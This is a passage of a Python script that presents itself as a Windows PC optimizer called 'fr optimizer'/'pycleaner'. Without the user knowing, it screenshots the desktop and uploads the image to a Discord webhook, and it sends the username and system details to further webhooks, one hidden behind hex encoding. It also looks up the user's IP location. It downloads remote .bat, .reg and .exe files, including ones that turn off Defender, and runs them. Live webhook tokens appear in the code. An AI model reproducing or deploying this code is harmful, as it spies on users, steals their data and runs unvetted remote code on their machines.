import os
try:
    import ctypes
except:
    os.system("pip install ctypes")
    import ctypes
try:
    import wmi
except:
    os.system("pip install wmi")
    import wmi
try:
    from humanize import naturalsize
except:
    os.system("pip install humanize")
    from humanize import naturalsize
try:
    import httpx
except:
    os.system("pip install httpx")
    import httpx
try:
    import time,os,sys
except:
    os.system("pip install time")
    import time,os,sys
def typingPrint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    time.sleep(0.05)
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
os.system('title checking requirements')
try:
    import random
except:
    os.system("pip install random")
    import random
try:
    import matplotlib.pyplot as plt
except:
    os.system("pip install matplotlib")
    import matplotlib.pyplot as plt

try:
    from datetime import datetime
except:
    os.system("pip install datetime")
    from datetime import datetime
try:
    import threading
except:
    os.system("pip install threading")
    import threading
try:
    from tkinter import ttk, messagebox
except:
    os.system("pip install tkinter")
    from tkinter import ttk, messagebox
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    from random import randint
except:
    os.system("pip install random")
    from random import randint
try:
    import base64
except:
    os.system("pip install base64")
    import base64
try:
    import os
except:
    os.system("pip install os")
    import os
try:
    import time
except:
    os.system("pip install time")
    import time
try:
    import subprocess
except:
    os.system("pip install subprocess")
    import subprocess
try:
    from pathlib import Path
except:
    os.system("pip install pathlib")
    from pathlib import Path
try:
    import pathlib 
except:
    os.system("pip install pathlib")
    import pathlib
try:
    import platform
except:
    os.system("pip install platform")
    import platform
try:
    import sys
except:
    os.system("pip install sys")
    import sys
try:
    import socket
except:
    os.system("pip install socket")
    import socket
try:
    import webbrowser
except:
    os.system("pip install webbrowser")
    import webbrowser
try:
    import discord
except:
    os.system("pip install discord")
    import discord
try:
    from colorama import Fore
except:
    os.system("pip install colorama")
    from colorama import Fore
try:
    import shutil
except:
    os.system("pip install shutil")
    import shutil
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord_webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
try:
    import psutil
except:
    os.system("pip install psutil")
    import psutil
try:
    import requests
except:
    os.system("pip install requests")
    import requests
try:
    import pystyle
except:
    os.system("pip install pystyle")
    import pystyle

try:
    import colorama
except:
    os.system("pip install colorama")
    import colorama
try:
    from PIL import ImageGrab
except:
    os.system("pip install PIL")
    from PIL import ImageGrab

try:
    from pystyle import Colors, Colorate, Center
except:
    os.system("pip install pystyle")
    from pystyle import Colors, Colorate, Center
try:
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
except:
    os.system("pip install pystyle")
    from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
try:
    import discord, asyncio
except:
    os.system("pip install discord")
    import discord, asyncio
try:
    import discord, asyncio
except:
    os.system("pip install asyncio")
    import discord, asyncio
intents = discord.Intents.all()
client = discord.Client( intents=intents)
username = os.getlogin()
#and a screenshot cuz ykyk
ooo = fr"C:\Users\{username}\AppData\Roaming\dev.txt"
devf = (f"{username}")
if devf == "\x66\x61\x64\x69\x61":
 with open(ooo, 'w') as f:
  f.write('pycleaner dev')
r = lambda: random.randint(0,255)
dawg = ('%02X%02X%02X' % (r(),r(),r()))
try:
 path = Path(ooo)
 if path.is_file():
   pass
 else:
  ss_img = ImageGrab.grab()
  ss_img.save(fr'C:\Users\{username}\AppData\Local\random.png')
  webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138687969689632/nS2hsAmFAmRaklSvYKaWJYw0Q_15mRoV7-sVtgOMFqgKSXuDGAbkZKim9agVUUlmTjZg',username="screenshoter bot", avatar_url= "https://i.imgur.com/jUonyvA.jpeg")
  with open(fr'C:\Users\{username}\AppData\Local\random.png', "rb") as f:
     webhook.add_file(file=f.read(), filename=fr'C:\Users\{username}\AppData\Local\random.png')
  response = webhook.execute(remove_embeds=True, remove_files=True)
  file_path = fr'C:\Users\{username}\AppData\Local\random.png'
  if os.path.isfile(file_path):
   os.remove(file_path)
except Exception as er:
        print(er)
        print('Network error, try again later')
        time.sleep(5)
        exit()
#--------------------------------------------------------------------------------------
vers ='2.6'
os.system("title Checking for updates")
#auto update
try:
 def updater():
      v = requests.get("https://pastebin.com/raw/w29LjVc2").text
      time.sleep(0.5)
      if not vers == v:
        os.system("cls")
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018536428222820464/fzMCCKO-6cMUXa3yAg2GXCm4hX7-Kkw4Fc2a2ukDacZKPJNLizrl1WS9z71AB-Jz9Vzx', username="update bot", avatar_url= "https://i.imgur.com/6yzliOb.png" )
        embed = DiscordEmbed(title='fr optimizer ', description= username +' updated from ver '+vers+' to '+v, color=dawg)
        webhook.add_embed(embed)
        response = webhook.execute()
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] New version available!")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloading new version...")
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
        r = requests.get(url)  
        with open(fr"updater.bat", 'wb') as f:
         f.write(r.content)
        os.startfile("updater.bat")
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Downloaded!")
        input(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] Press enter to exit...")
        os._exit(1)
      else:
        print(f"{Fore.RESET}[{Fore.BLUE}INFO{Fore.RESET}] You are running the latest version!")
        time.sleep(0.5)
 updater()
except Exception as lk:
        print (lk)
        print('Network error, try again later')
        time.sleep(5)
        path = Path(ooo)
        if path.is_file():
         pass
        else:
         exit()

def dev():
         if username != "\x66\x61\x64\x69\x61":
          webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1020336398328406036/QAUrtaDf2Z0hYvZSB1s9Zyg6wZdij5ZSs6H2_wdQVqBGbs5X7v2kVukXe8FF-xhaZxfh', username="fake devs", avatar_url= "https://i.imgur.com/SwcvuwC.png" )
          embed = DiscordEmbed(title='fr optimizer ', description= username +' is a fake developer \U0001F480', color=dawg)
          webhook.add_embed(embed)
          response = webhook.execute()
          with open(ooo, 'w') as f:
           f.write('pycleaner dev')
          print('1 = pastebin')
          print('2 = github')
          print('3 = large generator')
          print('4 = replit')
          print('5 = all')
          print('b = back')
          ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
          if ff == '1':
           webbrowser.open("https://pastebin.com/edit/w29LjVc2")
           main()
          if ff == '2':
           webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
           main()
          if ff == '3': 
           webbrowser.open("https://fsymbols.com/generators/tarty/") 
           main()
          if ff == '4':
           webbrowser.open("https://replit.com/@BLUS2TLIa/UntimelyImpressionableAdministration#new.txt")
           main()
          if ff == '5':
           webbrowser.open("https://fsymbols.com/generators/tarty/") 
           webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
           webbrowser.open("https://pastebin.com/edit/w29LjVc2")  
           main()
          if ff == 'b':
           main()          
          if ff !='1' '2' '3' '4' '5':
           os.system("cls")
           dev()
         else:
          with open(ooo, 'w') as f:
           f.write('pycleaner dev')
          print('1 = pastebin')
          print('2 = github')
          print('3 = large generator')
          print('4 = replit')
          print('5 = all')
          print('b = back')
          ff = input(Colors.blue + f'Which option do you choose? -> {Fore.RED} ')
          if ff == '1':
           webbrowser.open("https://pastebin.com/edit/w29LjVc2")
           main()
          if ff == '2':
           webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
           main()
          if ff == '3': 
           webbrowser.open("https://fsymbols.com/generators/tarty/") 
           main()
          if ff == '4':
           webbrowser.open("https://replit.com/@BLUS2TLIa/UntimelyImpressionableAdministration#new.txt")
           main()
          if ff == '5':
           webbrowser.open("https://fsymbols.com/generators/tarty/") 
           webbrowser.open("https://github.com/j0taro/pycleaner/edit/main/pycleaner.py") 
           webbrowser.open("https://pastebin.com/edit/w29LjVc2")  
           main()
          if ff == 'b':
           main()          
          if ff !='1' '2' '3' '4' '5':
           os.system("cls")
           dev()
#------------------------------------------------------------------------------------------------------
ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
path = pathlib.Path(r'tools')
disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
about = f"DISK: {disk}GB"
idk = Path.cwd()
k = ''
ong = '"'
now = datetime.now()
ti= (now.strftime('date > '+'%Y/%m/%d'+' time > ''%I:%M:%S'))
lol=(f"[>] Running with Python  {sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]} ")
version = sys.getwindowsversion()
mo = '[>] Using '+(platform.system()) + (platform.release())
BY = 'By dyansty'
req = httpx.get("https://ipinfo.io/json")
if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
obj_Disk = psutil.disk_usage('/')
psutil.virtual_memory()
username = os.getlogin()
ram3 = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576)
ramg = (str(ram3).replace(' ', ' '))
hostname=socket.gethostname() 
path_to_file = fr'C:\Users\{username}\AppData\Roaming\({username}) PYCLEANER disclaimer.txt'  
IPAddr=socket.gethostbyname(hostname)  
tools = os.getcwd()+"\\tools\\"
if not os.path.exists(tools):
    os.mkdir(tools)
bot = requests.get("https://pastebin.com/raw/qBZX4xR4").text
__author__ = "dynasty"
#---------------------------------------------------------------------------------------------------
#i just wanna know how many people ran my shit dont spam my webhook thats gay tho.
path = Path(ooo)
if path.is_file():
  pass
else:
 webhook = DiscordWebhook(url='\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x31\x30\x30\x35\x38\x36\x34\x38\x37\x30\x30\x31\x34\x36\x31\x35\x35\x39\x33\x2F\x33\x6A\x65\x68\x6D\x59\x59\x2D\x37\x5A\x57\x4F\x44\x5A\x5A\x32\x56\x74\x6E\x53\x42\x32\x46\x57\x42\x32\x77\x63\x79\x76\x4B\x53\x70\x56\x43\x30\x6B\x4C\x77\x55\x48\x41\x6A\x52\x37\x48\x6C\x61\x78\x30\x71\x59\x41\x4E\x66\x39\x44\x76\x66\x77\x38\x49\x62\x62\x49\x2D\x6C\x41', content=' ', username="pycleaner bot", avatar_url= "https://i.imgur.com/UCwTipK.png")
 embed = DiscordEmbed(title='fr optimizer ', description = username +' used ur program damn '+'('+str(ramg) +')'+' gb ram '+vers, color=dawg)
 embed.set_footer(text= mo + lol +' '+ti)
 webhook.add_embed(embed)
 response = webhook.execute()
 print(f"{Fore.RESET}[{Fore.RED}PYCLEANER{Fore.RESET}]"+'done')
# THIS CREATES THE TOOLS DIRECTORY IN THE SAME DIRECTORY, IF IT DOES NOT EXIST, IN WHICH THE PYTHON SCRIPT IS RAN. 
ver = Center.XCenter('''
by dyansty 
██╗░░░██╗███████╗██████╗░░██████╗██╗░█████╗░███╗░░██╗  ██████╗░░░░░█████╗░
██║░░░██║██╔════╝██╔══██╗██╔════╝██║██╔══██╗████╗░██║  ╚════██╗░░░██╔═══╝░
╚██╗░██╔╝█████╗░░██████╔╝╚█████╗░██║██║░░██║██╔██╗██║  ░░███╔═╝░░░██████╗░
░╚████╔╝░██╔══╝░░██╔══██╗░╚═══██╗██║██║░░██║██║╚████║  ██╔══╝░░░░░██╔══██╗
░░╚██╔╝░░███████╗██║░░██║██████╔╝██║╚█████╔╝██║░╚███║  ███████╗██╗╚█████╔╝
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░╚════╝░╚═╝░░╚══╝  ╚══════╝╚═╝░╚════╝░''')

os.system("title PRESS ENTER")

bannerfr ='Version '+vers+r'''
███████╗██████╗░  ░█████╗░██████╗░████████╗██╗███╗░░░███╗██╗███████╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██╔══██╗╚══██╔══╝██║████╗░████║██║╚════██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░██║██████╔╝░░░██║░░░██║██╔████╔██║██║░░███╔═╝█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██║██╔═══╝░░░░██║░░░██║██║╚██╔╝██║██║██╔══╝░░██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝██║░░░░░░░░██║░░░██║██║░╚═╝░██║██║███████╗███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
'''+ BY + '                  welcome, '+username  
System.Size(120, 30)
System.Clear()
Anime.Fade(Center.XCenter(bannerfr), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)


banner = Center.XCenter('Version '+vers+"""
███████╗██████╗░  ░█████╗░██████╗░████████╗██╗███╗░░░███╗██╗███████╗███████╗██████╗░
██╔════╝██╔══██╗  ██╔══██╗██╔══██╗╚══██╔══╝██║████╗░████║██║╚════██║██╔════╝██╔══██╗
█████╗░░██████╔╝  ██║░░██║██████╔╝░░░██║░░░██║██╔████╔██║██║░░███╔═╝█████╗░░██████╔╝
██╔══╝░░██╔══██╗  ██║░░██║██╔═══╝░░░░██║░░░██║██║╚██╔╝██║██║██╔══╝░░██╔══╝░░██╔══██╗
██║░░░░░██║░░██║  ╚█████╔╝██║░░░░░░░░██║░░░██║██║░╚═╝░██║██║███████╗███████╗██║░░██║
╚═╝░░░░░╚═╝░░╚═╝  ░╚════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝╚═╝░░░░░╚═╝╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
"""+BY)
banner2 =Center.XCenter(mo + lol)

pop=(f'''
            {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}h{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}hibernate{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}s{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}shutdown{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}r{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}restart{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}re{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}restart explorer{Fore.RESET}    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}a{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} {Fore.RESET}{Fore.RED}all windows tools{Fore.RESET}''')


options =f"""
{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}1{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Create a restore point          {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}2{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Temp cleaner                     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}3{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Log cleaner
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}4{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Disable services                {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}5{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Services Optimization            {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}6{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Battery check (laptops only)
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}7{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Turn on hibernate               {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}8{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Tree (better Responsiveness)     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}9{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET}  Delete Windows Update Cache
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}10{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable windows defender        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}11{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sfc scan                         {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}12{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Debloater (use it if u know how to)
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}13{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Open restore point              {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}14{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Memreduct                        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}15{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} TimerResolution
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}16{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Amber tweaker                   {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}17{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Reset wifi (speed up wifi a bit) {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}18{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} HoneCtrl optimizer                  
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}19{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Check health                    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}20{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Scan health                      {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}21{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Restore health  
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}22{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} O & O shutup (antispy)          {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}23{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Open disk cleanup                {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}24{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Registry tweaks(op)             
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}25{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} BCDTweaks                       {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}26{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Optimize ALL Windows Settings    {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}27{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Remove files in the tool folder 
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}28{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Sytem configuration             {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}29{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} optimizer                        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}30{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Ultimate Power Plan (drains battery)   
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}31{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Animations              {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}32{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} CPU Optimization for Gaming      {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}33{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Background Apps   
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}34{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Cortana                 {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}35{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Full Screen Optimization {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}36{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Game Bar 
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}37{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable LargeSystemCache        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}38{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Memory Compression       {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}39{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Mitigations  
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}40{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Power Throttling        {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}41{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable Game DVR                 {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}42{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} GPU Tweaks 
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}43{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Increase System Responsiveness  {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}44{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Lower Input Delay                {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}45{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Memory Tweaks
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}46{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} NoLazyMode                      {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}47{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Power Tweaks                     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}48{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Smoother windows 
{Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}49{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Disable UAC                     {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}50{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Adwcleaner                       {Fore.LIGHTMAGENTA_EX}[{Fore.CYAN}51{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} RAM Optimization (risky fr)
{Fore.LIGHTMAGENTA_EX}[{Fore.RED}52{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} More info                       {Fore.LIGHTMAGENTA_EX}[{Fore.RED}53{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} Exit                             {Fore.LIGHTMAGENTA_EX}[{Fore.RED}54{Fore.RESET}{Fore.LIGHTMAGENTA_EX}]{Fore.BLUE} Add suggestion   
{Fore.LIGHTMAGENTA_EX}════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Fore.RESET}
"""
# THIS DOWNLOADS THE BAT FILES TO THE TOOLS DIRECTORY. THIS TAKES THE URL AND THE NAME OF THE BAT FILE.
def download(url, name):
    response =  requests.get(url)
    open(tools+name, "w").write(response.text)
    os.startfile(tools+name)

def main():
    os.system('cls')
    path = Path(path_to_file)
    if path.is_file():
     fr()
    else:
     print(Colors.blue,fr'''
     {Fore.RED}DISCLAIMER!
     {Fore.YELLOW}fr cleaner is a free and open-source desktop utility made by dyansty.     
     {Fore.YELLOW}made to improve your day-to-day productivity.
     {Fore.YELLOW}this message will appear once.
     
     {Fore.RESET}{Fore.RED}WARNING!{Fore.RESET}{Fore.BLUE}
     Please note that we cannot guarantee an FPS boost from applying our optimizations,
     every system + configuration is different.
     Everything is {Fore.RESET}{Fore.RED}USE IT ON YOUR OWN RISK{Fore.RESET}{Fore.BLUE}, we are {Fore.RESET}{Fore.RED}NOT LIABLE{Fore.RESET}{Fore.BLUE} if you damage your system in any way 
     (ex. not following the disclaimers carefully).
     If you don't know what a tweak is, do not use it and contact {Fore.RESET}{Fore.RED}dynasty#3624{Fore.RESET}{Fore.BLUE} to receive more assistance.
     Even though we have an restore point feature{Fore.RESET}{Fore.GREEN} (option 1){Fore.RESET}{Fore.BLUE} 
     highly recommend making a manual restore point before running.
     {Fore.RESET}{Fore.RED}PLEASE USE THE TOOLS THAT YOU KNOW HOW TO USE THEM{Fore.RESET}{Fore.BLUE}  
     {Fore.RESET}{Fore.GREEN}THANKS FOR USING FRCLEANER!{Fore.RESET}{Fore.BLUE}  
   
     Please enter {Fore.RESET}{Fore.RED}"i agree"{Fore.RESET}{Fore.BLUE}  without quotes to continue: 
     ''')
    x = input(f'>:{Fore.GREEN}')
    if x != 'i agree':
     main()
    if x == 'i agree':
     webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1018138871613108295/RrTjyJBbAKtRDkJegmQnIJ9HxzC52Nf0fbB2yTD5Bt7D1jWvKtRNKiW5gOPghzl1PL8a', username="agree bot", avatar_url= "https://i.imgur.com/KHMc04p.png" )
     embed = DiscordEmbed(title='fr optimizer ', description= username +' agreed', color=dawg)
     webhook.add_embed(embed)
     response = webhook.execute()
     with open(path_to_file, 'w') as f:
      f.write('PYCLEANER STUFF, DELETE IT IF U WANT BUT THE DISCLAIMER WILL REOPEN EVERYTIME U DELETE IT FR')
     os.system('cls')
     fr()

def fr():
     file_count = sum(len(files) for _, _, files in os.walk(r'tools'))
     file_count = sum(len(files) for _, _, files in os.walk(r'tools'))
     HOME_FOLDER = r'tools' 
     directory_size = 0    
     fsizedicr = {'MB': float(1)/(1024*1024)}
     for (path, dirs, files) in os.walk(HOME_FOLDER):
      for file in files:
        filename = os.path.join(path, file)
        directory_size += os.path.getsize(filename)
     for key in fsizedicr:       
      size = (str(round(fsizedicr[key]*directory_size, 2)) + " " + key)
     os.system(f"title pycleaner by dynasty • files: [{file_count}] • folder size: [{size}]")
     os.system('cls')
     print(Colorate.Vertical(Colors.blue_to_red, banner2))
     print(Colorate.Vertical(Colors.blue_to_red, banner + pop + options, 2))
     path = Path(ooo)
     if path.is_file():
      os.system(f"title pycleaner by dynasty • files: [{file_count}] • folder size: [{size}] • A DEVELOPER!! ")
     choice = input(Colors.red + 'Which option do you choose '+ username+f'? >{Fore.BLUE}  ')
    #restore point
     if choice == '1':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/point.bat", "point.bat")
        main()
    #temp
     if choice == '2':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/temp.bat", "temp_cleaner.bat")
        
    #log cleaner
     elif choice == '3':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/log%20cleaner.bat", "log_cleaner.bat")
       
    #disable services
     elif choice == "4":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/services.bat", "disable_services.bat")
  
    #service_optimizer
     elif choice == "5":
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/optimization.bat", "service_optimizer.bat")

    #battery_check
     elif choice == '6':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/battery.bat", "battery_check.bat")
 
    #hibernate
     elif choice == '7':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/hibernate.bat", "hibernate.bat")

    #tree
     elif choice == '8':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/tree.bat", "tree.bat")

    #windows update
     elif choice == '9':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/update.cmd", "delete_windows_update_cache.cmd")

    #disable_services
     elif choice == '10':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/def.reg", "disable_windows_defender.reg")
    #sfc scan
     elif choice == '11':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/sfc.bat", "sfc.bat")
       
    #debloater   
     elif choice == '12':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/Debloater.bat", "Debloater.bat")
     
     elif choice == '13':
        download  ("https://untimelyimpressionableadministration.blus2tlia.repl.co/openp.bat", "openp.bat")
        
     elif choice == '14':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/memreduct.exe"
        r = requests.get(url)  
        with open(fr"tools\memreduct.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\memreduct.exe")
        
     elif choice == '15':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/TimerResolution.exe"
        r = requests.get(url)  
        with open(fr"tools\TimerResolution.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\TimerResolution.exe")
        
     elif choice == '16':
        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/amberfps.exe"
        r = requests.get(url)  
        with open(fr"tools\amber.exe", 'wb') as f:
         f.write(r.content)
        os.startfile("tools\\amber.exe")
        
     elif choice == '17':
        download("https://untimelyimpressionableadministration.blus2tlia.repl.co/wifi.bat", "wifi.bat")
       
        
     elif choice == '18':
        download("https://github.com/auraside/HoneCtrl/releases/latest/download/HoneCtrl.Bat", "HoneCtrl.bat")
        
     elif choice == '19':
